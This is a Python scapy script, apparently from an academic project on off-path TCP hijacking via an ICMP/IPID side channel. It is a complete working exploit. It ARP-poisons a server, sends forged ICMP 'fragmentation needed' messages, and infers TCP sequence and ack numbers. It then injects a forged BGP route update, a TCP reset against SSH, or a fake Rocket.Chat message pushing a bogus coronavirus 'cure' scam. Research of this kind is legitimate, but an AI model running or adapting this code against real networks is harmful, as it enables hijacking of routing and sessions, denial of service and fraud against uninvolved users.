# coding=utf-8

import socket
import struct
import threading
import time
from scapy.all import *
from scapy.layers.inet import *
from scapy.layers.l2 import *

from Final.webscoket_gen import get_websocket_messege


"""
    @CreateDate:    2020/2/23
    @Group:         Off-Path TCP Exploit Via ICMP
                    and IPID Side-Channel
    @Project:       Work2
    @Filename:      ack_find.py
    @Brief:         This program is used for finding exact sequence number. Here, we assume 
                    an active TCP connection has been found using connection_find.py. And
                    then an in-window sequence number has also been found using seq_find.py
                    First, this program find an in-challenge-window ack number (quiet easy)
                    for triggering challenge-acks.
                    Second, this program using multi-bin search to find left bound of the
                    ack-challenge-window. Because left bound of this challenge-ack-window
                    plus 2G is the the next seq number to be acknowledge on server side. It
                    is a acceptable ack number.
                    Third, this program using in-challenge-window ack number to binary search
                    the exact sequence number which is the sequence number server want to be
                    received.
                    Finally, using the acceptable ack number and the exact seq number, this 
                    program can inject data segment into channel.
                    An use case is shown in code which can construct BGP Update Message and
                    inject forged routing entry to target BGP peer.
    @Modify:        2020/3/10    Kevin.F:    add ICMP Filter equation
                    2020/3/18    Kevin.F:    Add script variable my_if_name
                    2020/3/18    Kevin.F:    change int convert for python 3
                    2020/3/18    Kevin.F:    Add icmp id filter equation
"""
forge_ip = '10.10.16.92'                    # hash collision IP (get form collision_find.py)
victim_ip = '10.10.100.1'                   # victim ip address
server_ip = '10.10.100.2'                   # server ip address
server_port = 3000                          # known server port (e.g. ssh:22 BGP:179 Rocket.Chat:3000)
client_port = 45546                         # found client port

seq_in_win = 3609070668                     # sequence number in receive window
ack_check_start = -1                        # in-challenge-window ack number
ack_left_bound = -1                         # left bound of challenge-ack-window
ack_in_win = -1                             # acceptable ack number
seq_num = -1                                # exact sequence number

server_mac_addr = '00:0c:29:20:f4:8c'       # mac address of server used for ARP poison
my_if_name= 'ens33'                         # bind one ethernet interface
my_mac_addr = get_if_hwaddr(my_if_name)     # mac address of attacker
z_payload = b''                             # full-zero byte string used for padding

BLOCK = 26703 * 3                           # sampling step-length
sleep_time = 0.5                            # for maximum challenge-ACK rate
finish = False                              # exit?

"""
    Finally, we can utilize <seq_num + 1, ack_in_win> inject any segment into Channel
    from client to server and vice versa.
"""

"""
    @Date:      2020/2/13
    @Author:    Kevin.F
    @Param:     
    @Return:    None, but trigger another arp poison thread. 
    @Brief:     We utilized arp-poison attack to fool the server that we own such a
                IP address which can cause IPID counter hash collision. 
"""
def arp_inject():
    forged_ip = forge_ip
    # here we send a UDP packet to allure server to execute ip/mac convert
    pkt = sniff(filter="arp " + "and dst " + forged_ip + " and ether src " + server_mac_addr,
                iface=my_if_name, timeout=0.5, count=1, started_callback=
                lambda: send(IP(src=forged_ip, dst=server_ip) / UDP(dport=80),
                             iface=my_if_name, verbose=False))

    if len(pkt) == 1 and pkt[0][1].fields['psrc'] == server_ip and pkt[0][1].fields['pdst'] == forged_ip:
        send(ARP(pdst=server_ip, hwdst=server_mac_addr, psrc=forged_ip, hwsrc=my_mac_addr, op=2),
             iface=my_if_name, verbose=False)

    time.sleep(1)

    if not finish:
        ts = threading.Thread(target=arp_inject)
        ts.start()


"""
    @Date:      2020/2/23
    @Author:    Kevin.F
    @Param:     
    @Return:    None, but trigger another same thread. 
    @Brief:     We send forged ICMP fragment needed ICMP error message. to trick
                the server into setting DF as 0 and Down-Dimension IPID assignment
                method from per-connection to hash based method.
"""
def tcp_fragment():
    send(IP(src=forge_ip, dst=server_ip) /
         ICMP(type=3, code=4, nexthopmtu=68) /
         IP(flags=2, src=server_ip, dst=victim_ip) /
         ICMP(type=0, code=0) /
         z_payload,
         iface=my_if_name, verbose=False)

    time.sleep(1)

    if not finish:
        tr = threading.Thread(target=tcp_fragment)
        tr.start()


"""
    @Date:      2020/2/23
    @Author:    Kevin.F
    @Param:     list_p    ->  A block of  sampled ack numbers
    @Return:    ipid_next ->  potential in-challenge-window ack numbers
    @Brief:     This function used for find in-challenge-window ack numbers which is same
                as the preclude-filter in seq_find.py.
"""
def check_new_list(list_p):
    C = len(list_p)
    icmp_seq = random.randint(0, (1 << 16) - 1)

    send_list = [IP(src=forge_ip, dst=server_ip) / ICMP(id=icmp_seq)]
    for ac in list_p:
        send_list.append(IP(src=victim_ip, dst=server_ip) /
                         TCP(sport=client_port, dport=server_port, seq=seq_in_win, ack=ac, flags='A'))
        send_list.append(IP(src=forge_ip, dst=server_ip) / ICMP(id=icmp_seq))

    while True:
        pkts = sniff(filter="icmp and icmp[4:2]=" + str(icmp_seq) + " and dst " + forge_ip,
                     iface=my_if_name, count=1 + C, timeout=1.5, started_callback=
                     lambda: send(send_list, iface=my_if_name, verbose=False))
        if len(pkts) != 1 + C:
            time.sleep(sleep_time)
        else:
            break

    ipids = []
    for pk in pkts:
        ipids.append(pk[1].fields['id'])

    list_next = []
    for i in range(1, C + 1):
        # print ipids[i] - ipids[i - 1]
        if ipids[i] - ipids[i - 1] >= 2:
            list_next.append(list_p[i - 1])

    return list_next


"""
    @Date:      2020/2/23
    @Author:    Kevin.F
    @Param:     list_p    ->  A block of  sampled seq numbers
    @Return:    ipid_next ->  potential in-receive-window seq numbers
    @Brief:     This function is used for find exact seq number which is called by find_seq
                function as a binary search judgement function.
                It is worth to mention here, before sending any probe ICMP messages, we
                send a forged TCP ack message to block the sending of challenge ack 
                (sysctl_invalid_ratelimit). If a seq number is out of window, a duplicate 
                ack will be send or nothing will happen (due to rate limit sysctl variable).
"""
def check_new_point_seq(list_p):
    C = len(list_p)
    icmp_seq = random.randint(0, (1 << 16) - 1)
    send_list = [IP(src=victim_ip, dst=server_ip) /
                 TCP(sport=client_port, dport=server_port, seq=seq_in_win, ack=ack_check_start, flags='A'),
                 IP(src=forge_ip, dst=server_ip) / ICMP(id=icmp_seq)]
    for sq in list_p:
        send_list.append(IP(src=victim_ip, dst=server_ip) /
                         TCP(sport=client_port, dport=server_port, seq=sq, ack=ack_check_start, flags='A') / 'a')
        send_list.append(IP(src=forge_ip, dst=server_ip) / ICMP(id=icmp_seq))

    while True:
        pkts = sniff(filter="icmp and icmp[4:2]=" + str(icmp_seq) + " and dst " + forge_ip,
                     iface=my_if_name, count=1 + C, timeout=1.5, started_callback=
                     lambda: send(send_list, iface=my_if_name, verbose=False))
        if len(pkts) != 1 + C:
            time.sleep(sleep_time)
        else:
            break

    ipids = []
    for pk in pkts:
        ipids.append(pk[1].fields['id'])


    list_next = []
    for i in range(1, C + 1):
        # print ipids[i] - ipids[i - 1]
        if ipids[i] - ipids[i - 1] < 2:
            list_next.append(list_p[i - 1])

    return list_next


"""
    @Date:      2020/2/23
    @Author:    Kevin.F
    @Param:     None
    @Return:    None
    @Brief:     This function is the binary search for finding the exact sequence number.
"""
def find_seq():
    global seq_num
    global finish

    rb = seq_in_win
    lb = seq_in_win - (BLOCK * 2)
    D = 6

    ans = -1
    while rb >= lb:
        mid = int((lb + rb) / 2)
        in_bound = True
        n = 0
        for i in range(0, D):
            if len(check_new_point_seq([mid])) == 0:
                n += 1

        if n > 1:
            in_bound = False

        if in_bound:
            ans = mid
            rb = mid - 1
        else:
            lb = mid + 1

    seq_num = ans
    print('Seq next: ' + str(seq_num))
    finish = True


"""
    @Date:      2020/2/23
    @Author:    Kevin.F
    @Param:     None
    @Return:    None
    @Brief:     This function is used for find left bound of challenge-ack-window 
                which is called by the judgement function of find_left_bound_ack to
                perform multi-bin search.
                This function is similar to any filters in seq_find.py or ack_find.py.
"""
def check_new_point_ack(list_p):
    C = len(list_p)
    icmp_seq = random.randint(0, (1 << 16) - 1)
    send_list = [IP(src=forge_ip, dst=server_ip) / ICMP(id=icmp_seq)]
    for ac in list_p:
        send_list.append(IP(src=victim_ip, dst=server_ip) /
                         TCP(sport=client_port, dport=server_port, seq=seq_in_win, ack=ac, flags='A'))
        send_list.append(IP(src=forge_ip, dst=server_ip) / ICMP(id=icmp_seq))

    while True:
        pkts = sniff(filter="icmp and icmp[4:2]=" + str(icmp_seq) + " and dst " + forge_ip,
                     iface=my_if_name, count=1 + C, timeout=1.5, started_callback=
                     lambda: send(send_list, iface=my_if_name, verbose=False))
        if len(pkts) != 1 + C:
            time.sleep(sleep_time)
        else:
            break

    ipids = []
    for pk in pkts:
        ipids.append(pk[1].fields['id'])

    list_next = []
    for i in range(1, C + 1):
        # print ipids[i] - ipids[i - 1]
        if ipids[i] - ipids[i - 1] >= 2:
            list_next.append(list_p[i - 1])

    if len(list_next) == 0:
        return None
    else:
        return list_next[0]


"""
    @Date:      2020/2/23
    @Author:    Kevin.F
    @Param:     None
    @Return:    None
    @Brief:     This function is the judgement function of find_left_bound_ack to
                perform multi-bin search.
"""
def C(ls, lb, rb):
    D = 2
    # revise
    for i in range(0, len(ls)):
        ls[i] = ls[i] if ls[i] >= 0 else ls[i] + (1 << 32)

    in_bound = lb
    for i in range(0, D):
        time.sleep(sleep_time)
        nb = check_new_point_ack(ls)
        if nb is None:
            i -= 1
        else:
            in_bound = max(in_bound, nb)

    return in_bound


"""
    @Date:      2020/2/23
    @Author:    Kevin.F
    @Param:     None
    @Return:    None
    @Brief:     This function is used for finding the left bound of challenge-ack-
                window, and get a acceptable ack number by adding 2G.
                This function performs a multi-bin search.
"""
def find_left_bound_ack():
    global ack_left_bound
    global ack_in_win
    rb = ack_check_start
    lb = rb - (1 << 31)
    L = 50

    while (rb - lb) >= L:
        step = int((rb - lb) / L)
        ls = [lb]
        for i in range(0, L - 1):
            ls.append(ls[-1] + step)
        ls.append(rb)

        in_bound = C(ls, lb, rb)
        rb = in_bound
        lb = rb - step

    ls = list(range(lb, rb + 1))
    ans = C(ls, lb, rb)

    ack_left_bound = ans if ans >= 0 else ans + (1 << 32)
    ack_in_win = (ack_left_bound + (1 << 31)) & ((1 << 32) - 1)
    print('ACK in win: ' + str(ack_in_win))


"""
    @Date:      2020/2/23
    @Author:    Kevin.F
    @Param:     None
    @Return:    None
    @Brief:     This function is used for enumerating (an) in-challenge-window ack(s).
                Fixed samples of ack numbers will be checked using check_new_list.
"""
def find_ack_challenge_win():
    global ack_check_start

    check_points = [0]
    for i in range(0, 3):
        check_points.append(check_points[-1] + (1 << 30))

    for i in range(0, 3):
        new_check_points = check_new_list(check_points)
        check_points = list(set(check_points) & set(new_check_points))
        time.sleep(sleep_time)

    check_points.sort()
    ack_check_start = check_points[0]
    print('Challenge ACK: ' + str(ack_check_start))


"""
    @Date:      2020/2/23
    @Author:    Kevin.F
    @Param:     None
    @Return:    None
    @Brief:     This function is used for inject fake BGP routing entry using the
                exact seq number and acceptable ack number.
                This function construct forged BGP update message and inject it
                into channel from client to server.
"""
def attack_action_bgp():
    one_payload = b''
    for i in range(0, 16):
        one_payload += struct.pack('B', (1 << 8) - 1)

    # basic BGP update message
    ll = 55
    type = 2
    WRL = 0
    attr_len = 28
    hd_bgp = struct.pack('!HBHH', ll, type, WRL, attr_len)

    # attr1
    flag1 = 0x40
    type1 = 1
    len1 = 1
    origin1 = 0
    attr1 = struct.pack('!BBBB', flag1, type1, len1, origin1)

    # attr2
    flag2 = 0x50
    type2 = 2
    len2 = 6
    seg_type = 2
    seg_len = 1
    AS4 = 1
    attr2 = struct.pack('!BBHBBL', flag2, type2, len2, seg_type, seg_len, AS4)

    # attr3
    flag3 = 0x40
    type3 = 3
    len3 = 4
    next_hop = socket.inet_aton('10.10.100.1')
    attr3 = struct.pack('!BBB4s', flag3, type3, len3, next_hop)

    # attr4
    flag4 = 0x80
    type4 = 4
    len4 = 4
    load = 0
    attr4 = struct.pack('!BBBL', flag4, type4, len4, load)

    # address info
    prefix_len = 24
    network_addr = socket.inet_aton('11.11.11.0')
    b_network = struct.pack('!B3s', prefix_len, network_addr[:3])

    bgp_payload = one_payload + hd_bgp + attr1 + attr2 + attr3 + attr4 + b_network

    # Attention Please. seq_num + 1, but not seq_num is the sequence number sever want to acquire.
    send_list = []
    send_list.append(IP(src=victim_ip, dst=server_ip, tos=0xc0) /
                     TCP(sport=client_port, dport=server_port, seq=seq_num + 1, ack=ack_in_win, flags='PA') /
                     bgp_payload)

    send(send_list, iface=my_if_name, verbose=False)


"""
    @Date:      2020/2/23
    @Author:    Kevin.F
    @Param:     None
    @Return:    None
    @Brief:     This function is used for reset SSH connection using the
                exact seq number.
                This function construct only one TCP Reset message and inject it
                into channel from client to server.
"""
def attack_action_ssh():
    send(IP(src=victim_ip, dst=server_ip, tos=0xc0) /
         TCP(sport=client_port, dport=server_port, seq=seq_num + 1, flags='R'),
         iface=my_if_name, verbose=False)


def attack_action_rocketchat():
    load = get_websocket_messege(forged_message=
                                 '------ 100% 2019-nCoV Treatment!!! ------\r\n' +
                                 '- 15 minutes to Diagnosis 2019 new Coronavirus,\r\n' +
                                 '  the minimum cost is only 325$!!!!!!\r\n' +
                                 '- 3 days to cure new coronavirus with 100%\r\n' +
                                 '  success rate. The minimum cost is only 4096$!!!\r\n\r\n' +
                                 'We have Advanced Medical Equipments and Specific \r\n' +
                                 'Medicine which is hard to buy on public markets.\r\n' +
                                 'Our Treatment will give you life-long immunity.\r\n\r\n' +
                                 'If you need our help or more details please contact\r\n' +
                                 'Doctor Feng at 16723452345.\r\n', room_id='zqYBGxeXzeLYdHf8L')

    send_list = []
    send_list.append(IP(src=victim_ip, dst=server_ip) /
                     TCP(sport=client_port, dport=server_port, seq=seq_num + 1, ack=ack_in_win, flags='PA') /
                     load)

    send(send_list, iface=my_if_name, verbose=False)


if __name__ == '__main__':
    starttime = datetime.now()

    # construct padding payload
    for i in range(0, 520):
        z_payload += struct.pack('B', 0)

    # start the ARP poison
    ts = threading.Thread(target=arp_inject)
    ts.start()

    # start sending forged ICMP needed
    tr = threading.Thread(target=tcp_fragment)
    tr.start()

    # attack BGP
    # find_ack_challenge_win()
    # find_left_bound_ack()
    # find_seq()
    # time.sleep(sleep_time)
    # attack_action_bgp()

    # attack SSH
    # find_ack_challenge_win()
    # find_seq()
    # attack_action_ssh()

    # attack Rocket.Chat
    find_ack_challenge_win()
    find_left_bound_ack()
    find_seq()
    time.sleep(sleep_time)
    attack_action_rocketchat()

    endtime = datetime.now()
    print((endtime - starttime).seconds)
